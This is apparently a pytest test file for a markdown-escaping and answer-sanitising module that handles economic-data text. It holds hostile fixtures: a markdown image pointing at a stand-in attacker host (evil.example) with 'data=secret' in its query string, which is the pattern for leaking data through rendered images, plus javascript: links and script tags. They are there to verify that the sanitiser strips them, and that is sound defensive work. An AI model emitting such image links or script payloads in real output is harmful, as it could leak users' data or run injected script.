import re

import pytest

from macrocal.text import escape_markdown, sanitize_answer


def test_escape_neutralises_images_and_links():
    out = escape_markdown("![x](http://evil.example/p.png?q=1) and [click](javascript:alert(1))")
    assert "![" not in out
    assert "](" not in out


@pytest.mark.parametrize("raw", ["Federal Statistics Office", "St. Louis Fed", "US CPI 3.4% YoY, 2026-10-05"])
def test_escape_keeps_ordinary_text_readable(raw):
    assert escape_markdown(raw) == raw


def test_escape_handles_none_and_non_strings():
    assert escape_markdown(None) == ""
    assert escape_markdown(42) == "42"


# --- exact output: a destroyed string also "neutralises" dangerous markdown, so check precisely ----
# (A bug once replaced every special character with the literal text "\1" and the checks above still
# passed, which is why these compare complete strings.)


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("US unemployment rate (%)", r"US unemployment rate \(%\)"),
        ("World Bank (CC-BY 4.0)", r"World Bank \(CC-BY 4.0\)"),
        ("a_b*c", r"a\_b\*c"),
        ("![x](http://evil.example/p.png)", r"\!\[x\]\(http://evil.example/p.png\)"),
        ("5 | 6 # 7 ~ 8 $ 9", r"5 \| 6 \# 7 \~ 8 \$ 9"),
        ("back\\slash", "back\\\\slash"),  # one backslash in, two out
    ],
)
def test_escape_adds_a_backslash_and_keeps_the_original_character(raw, expected):
    assert escape_markdown(raw) == expected


@pytest.mark.parametrize(
    "raw",
    [
        "US CPI-U, all items (index)",
        "Gold futures",
        "GDP (current US$)",
        "x_y_z [1] <b> !",
        "Fed & ECB: 3.5%",
        "path\\with\\backslashes",
    ],
)
def test_escaping_loses_no_information(raw):
    unescaped = re.sub(r"\\(.)", r"\1", escape_markdown(raw))
    assert unescaped == raw


def test_escaped_text_never_contains_an_unescaped_link_or_image_opener():
    out = escape_markdown("see ![a](http://x) and [b](http://y)")
    assert not re.search(r"(?<!\\)\]\(", out)  # no "](" that is not preceded by a backslash
    assert not re.search(r"(?<!\\)!\[", out)


def test_sanitize_answer_removes_markdown_images():
    out = sanitize_answer("Unemployment is 4.2%. ![t](https://evil.example/x.png?data=secret) Done.")
    assert "evil.example" not in out
    assert "4.2%" in out


def test_sanitize_answer_removes_html_tags_but_keeps_text():
    out = sanitize_answer('<img src="http://evil/x"> Rate <b>4.2%</b><script>alert(1)</script>')
    assert "<" not in out
    assert "Rate" in out and "4.2%" in out
    assert "alert" not in out


def test_sanitize_answer_keeps_normal_markdown():
    text = "**Rate** is 4.2%:\n\n- item one\n- item two\n\n| a | b |\n|---|---|\n| 1 | 2 |"
    assert sanitize_answer(text) == text


def test_sanitize_answer_keeps_plain_links():
    assert "[BLS](https://www.bls.gov)" in sanitize_answer("See [BLS](https://www.bls.gov).")
